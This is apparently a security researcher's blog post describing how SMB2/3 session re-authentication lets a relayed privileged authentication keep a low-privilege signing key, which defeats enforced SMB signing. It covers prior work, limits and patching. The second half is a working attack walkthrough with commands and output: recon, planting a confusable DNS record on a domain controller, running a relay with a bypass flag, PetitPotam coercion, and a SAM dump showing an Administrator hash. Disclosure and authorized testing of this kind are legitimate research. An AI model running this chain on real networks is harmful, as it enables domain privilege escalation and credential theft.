---
layout: post
title: "Defeating enforced SMB signing: a note"
date: 2026-10-21
tags: [smb, relay, ntlm, kerberos, cve-2025-33073, cve-2025-58726, cve-2026-26128, cve-2026-24294]
description: "A documented SMB2/3 re-authentication behavior that keeps a reflected authentication working against a signing-required target."
---

> Corrections are very welcome; I am almost certainly missing nuance and prior art.
>
> Short version: SMB signing is the mitigation everyone recommends against the whole relay class of
> attacks (NTLM or Kerberos). It is usually treated as a brick wall: turn it on, and relay is dead.
> Right?

![the Padme "right?" meme](/assets/img/right.png)

## Current state of the art (short)

Relay: an attacker captures an authentication (NTLM or Kerberos) and forwards it to a service, acting as
the victim. Reflection is the case where it is sent back to the machine it came from.

Enforced SMB signing is the usual way to stop relay to SMB, whatever the authentication protocol. Without
the session key, the attacker cannot sign the traffic, so a signing-required target refuses the session.
[Domain Controllers require SMB signing by default](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview).

The recent public work reaches the same wall and stops there, for SMB:

- [Synacktiv](https://www.synacktiv.com/en/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part)'s
  follow-up on the CVE-2025-33073 mitigations states that once loopback signing is enforced, reflection
  attacks against the SMB service "seem definitely fixed", and the research pivots to HTTP.
- [SySS](https://blog.syss.com/posts/kerberos-reflection/) lists "server-side SMB signing must not be
  enforced" as a precondition for their SMB reflection.
- [SpecterOps](https://specterops.io/blog/2025/04/08/the-renaissance-of-ntlm-relay-attacks-everything-you-need-to-know/)'
  relay survey presents enforced SMB signing as the right way to mitigate relay.

Everything below stands on that work.

## The SMB signing angle

SMB lets a client re-authenticate an existing session. When it does, the server keeps the original
signing key rather than deriving a new one: the specification says "the existing Session.SessionKey
will be retained" ([MS-SMB2, section 3.3.5.5.2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5ecc02fb-0e60-4cba-afeb-f13100a6e65e)),
and the server only regenerates the signing key when the request "is not for session reauthentication"
([MS-SMB2, section 3.3.5.5.3](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5ed93f06-a1d2-4837-8954-fa8b833c2654), step 7). So on re-authentication the original key is kept, and that part is documented.

What the specification describes here is a principal re-authenticating its own session (for example
after it expires), not a different identity being swapped onto an existing session's key. The server
simply does not re-check that the re-authenticating identity matches the original one, and that missing
check, rather than the key retention itself, is what makes the swap possible.

So the idea is simple: open an SMB session as a low-privilege account you control (so you can sign it),
then re-authenticate that same session with the relayed authentication of a privileged
account. The session's identity becomes privileged, but signing keeps using the key you control, so a
target that requires signing still accepts it.

On any host that requires SMB signing, Domain Controllers included, a relayed privileged authentication
yields a privileged session that is still signed with the low-privilege key. Enforced signing did not
stop it.

## What it implies today

With enforced signing defeated, that barrier is gone: where a relay's other preconditions are met, a
coerced or captured authentication (NTLM or Kerberos) can reach a signing-required SMB server again -
reflective relay,
where the victim and the target are the same host, being one case. So "this target enforces signing,
relay is dead" is no longer automatically true, on any host that does not also enforce a matching
identity on re-authentication - Domain Controllers first.

Limits, so this is not over-read:

- Defeating signing is not a compromise by itself. It only lets a relayed authentication be accepted
  again - on its own that gains nothing. You still need to capture and relay the authentication of an
  identity that has privileges on the target, NTLM or Kerberos (through LLMNR or mDNS poisoning,
  coercion, and so on).
- The clean fix is to require the same identity on re-authentication (the check the specification
  already defines for binding). Enforced SMB signing stays necessary; it is just not sufficient on its
  own against this.

## A note on patching

This looks like it is being fixed. A same-user check on re-authentication shows up on
Windows 11 24H2 / Server 2025 around September 2026, and similar changes seem to have
reached the other supported Windows versions, servers and workstations alike, in the
weeks after. I have not traced every build, and one or two end-of-life versions may never
receive it. So it is probably better read as a patch window than a permanent gap: a host
that is current on updates is likely no longer affected, while hosts behind that wave
still are. I could not find a CVE for this specific change, in Microsoft's update guide, the KB notes, or public
trackers; it reads as silent hardening rather than a tracked fix. Corrections welcome.

## Tools

Two small things, for authorized testing only:

- [reauthx](https://github.com/aas-n/reauthx){:target="_blank" rel="noopener"}: a small fork of krbrelayx that adds one opt-in flag,
  `--reauth-bypass`. With the flag off, it behaves exactly like krbrelayx. It also ships `patchcheck.py`
  (recon) and `coerce_name.py` (coercion-name helper).
- A NetExec module, `reauth_swap`, that checks whether a host still allows the cross-user
  re-authentication swap.

What follows is an example. Two low-privilege
domain accounts the attacker controls: `user1` does the real work (recon, the DNS record on the DC, the coercion, and the relay's base
session); `user2` is only the second identity the step 1 viability check needs to test the cross-user
swap. The target is `FS01` at `10.0.0.10`; the DC that holds
the AD-integrated DNS zone is at `10.0.0.5`; the relay listens on `10.0.0.50`.

**1. Recon** - the one precondition to confirm first is that the target **enforces SMB signing**
(`signing:True` in both outputs below). That is the wall this technique walks through; if signing were
not enforced, a plain relay would already work and none of this would be needed. The NetExec module
checks viability directly, and `patchcheck.py` then places the host in the patch window - here the first
patch (CVE-2025-33073) is already in, so the CMTI name is dead and the coercion goes through a Unicode
confusable name instead.

```
$ nxc smb 10.0.0.10 -u user1 -p Passw0rd1 -d AD.LOCAL -M reauth_swap -o PROBE_USER=user2 PROBE_PASS=Passw0rd2

SMB          10.0.0.10  445  FS01  [*] Windows Server 2022 Build 20348 x64 (name:FS01) (domain:ad.local) (signing:True)
SMB          10.0.0.10  445  FS01  [+] ad.local\user1:Passw0rd1
REAUTH_SWAP  10.0.0.10  445  FS01  VULNERABLE - enforced SMB signing bypassable
REAUTH_SWAP  10.0.0.10  445  FS01  Next step: https://blackfield.ch/blog/defeating-enforced-smb-signing/
```

```
$ python3 patchcheck.py 'AD.LOCAL/user1:Passw0rd1@10.0.0.10' --probe 'user2:Passw0rd2'

[*] 10.0.0.10:445   FS01   build 10.0.20348.2402   signing:True   role:member
    probe #4  user1 -> user2   STATUS_SUCCESS

    #1  CVE-2025-33073         client reflection (CMTI)        patched
    #2  CVE-2025-58726         loopback source-IP (GhostSPN)   absent
    #4  same-user re-auth      (Sep 2026, feature flag)        absent

[+] RCE   33073 patched, 58726 absent
    coercion   Unicode (CMTI dead)
    relay      remote
    signing    re-auth signing bypass required
```

**2. Point a DNS record at the relay** - build the coercion name for the target, add an AD-integrated
DNS record for it on the DC, and confirm it resolves to the relay. The Unicode name carries a confusable
letter (and the dots are confusables too), so it is built in a sub-shell and never typed by hand; I do
not print it literally below.

```
$ NAME="$(python3 coerce_name.py fs01.ad.local --mode unicode --raw)"   # confusable name for fs01.ad.local

$ bloodyAD -u user1 -p Passw0rd1 -d ad.local --host dc01.ad.local add dnsRecord "$NAME" 10.0.0.50
[+] record added successfully

$ dig +noidnin +noidnout +short "$NAME.ad.local" @10.0.0.5
10.0.0.50
```

**3. Start the relay with the signing bypass** - the base session is `user1`, whose signing key you
control. Leave it running.

```
$ sudo python3 krbrelayx.py -t smb://10.0.0.10 --reauth-bypass 'AD.LOCAL/user1:Passw0rd1'
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Setting up SMB Server
[*] Servers started, waiting for connections
```

**4. Coerce the target** - it authenticates to the relay, which reflects it back onto FS01 while
keeping `user1`'s signing key.

```
$ python3 PetitPotam.py -d AD.LOCAL -u user1 -p Passw0rd1 "$NAME" 10.0.0.10
[*] Connecting to ncacn_np:10.0.0.10[\PIPE\lsarpc]
[*] Connected!
[*] Sending EfsRpcOpenFileRaw!
[*] Attack worked!
```

The relay window then shows the swap and a SYSTEM-level dump:

```
[*] SMBD: Received connection from 10.0.0.10
[*] [reauth-bypass] base session user1 signingKey=6b5e6027d709724bf5298a3335173119
[*] [reauth-bypass] reflected re-auth status=0x00000000
[*] [reauth-bypass] SUCCESS - privileged session kept, signing with the low-priv key
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Done dumping SAM hashes for host: 10.0.0.10
```

**5. Cleanup** - remove the DNS record and stop the relay.

```
$ bloodyAD -u user1 -p Passw0rd1 -d ad.local --host dc01.ad.local remove dnsRecord "$NAME" 10.0.0.50
[-] record removed successfully
```

Repository: [github.com/aas-n/reauthx](https://github.com/aas-n/reauthx){:target="_blank" rel="noopener"}.

## Credits and references

I am not the person who did the hard work here. I connected dots that others drew, and I am small
next to the researchers who actually move this field. Thanks in particular to:

- Dirk-jan Mollema, for krbrelayx, which this forks.
- Synacktiv (yaumn), for the modern authentication reflection analysis.
- SySS, Semperis, and SpecterOps, for the research this note leans on.

References:

- [MS-SMB2 3.3.5.5, Receiving an SMB2 SESSION_SETUP Request](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/e545352b-9f2b-4c5e-9350-db46e4f6755e)
- [MS-SMB2 3.3.5.5.2, Reauthenticating an Existing Session](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5ecc02fb-0e60-4cba-afeb-f13100a6e65e)
- [MS-SMB2 3.3.5.5.3, Handling GSS-API Authentication](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5ed93f06-a1d2-4837-8954-fa8b833c2654)
- [SMB signing overview (Microsoft)](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview)
- [Synacktiv, Bypassing Windows authentication reflection mitigations for SYSTEM shells](https://www.synacktiv.com/en/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part)
- [SySS, Kerberos relaying/reflection over SMB](https://blog.syss.com/posts/kerberos-reflection/)
- [Semperis, Ghost SPNs and Kerberos reflection (CVE-2025-58726)](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)
- [SpecterOps, The Renaissance of NTLM Relay Attacks](https://specterops.io/blog/2025/04/08/the-renaissance-of-ntlm-relay-attacks-everything-you-need-to-know/)
- [CrowdStrike, CVE-2025-54918 analysis (flag-stripping, a different technique)](https://www.crowdstrike.com/en-us/blog/analyzing-ntlm-ldap-authentication-bypass-vulnerability/)
- [Microsoft, KB5124008 (8 September 2026 security update; first build carrying the same-user check)](https://support.microsoft.com/help/5124008)
